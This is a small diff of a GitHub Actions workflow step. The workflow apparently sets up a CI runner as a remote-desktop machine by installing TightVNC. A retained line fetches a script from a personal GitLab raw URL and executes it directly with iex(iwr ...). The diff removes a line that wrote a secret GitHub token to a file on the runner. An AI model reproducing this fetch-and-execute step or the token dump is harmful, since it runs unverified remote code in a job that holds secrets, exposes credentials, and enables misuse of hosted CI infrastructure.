@@ -33,7 +33,6 @@ jobs:
       shell: pwsh
       run: |
         iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)
-        $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\a\vpstoken.txt"
         
         try {
           Write-Host "📥 Installing TightVNC..."
